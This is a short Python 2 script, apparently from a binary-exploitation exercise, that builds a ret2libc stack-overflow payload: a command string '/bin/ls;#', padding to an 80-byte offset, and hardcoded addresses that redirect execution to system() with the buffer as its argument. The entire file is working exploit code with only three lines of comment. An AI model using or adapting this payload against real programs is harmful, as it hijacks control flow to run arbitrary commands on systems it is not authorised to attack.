#!/usr/bin/python


# Use a ret command from main 
# and then ret2libc to call system() 
# with the address of the buffer as args

offset = 80

cmd = "/bin/ls;#"

pad = "A" * (offset - len(cmd))

bufAddr = "\x17\x86\x04\x08"

ret1 = "\xb0\xff\xec\xb7"
ret2 = "\xc0\x60\xec\xb7"

arg1 = "\x5c\xfc\xff\xbf"
arg2 = "\xf0\xff\xff\xff"


payload = cmd + pad + bufAddr + ret1 + ret2 + arg1 + arg2

print payload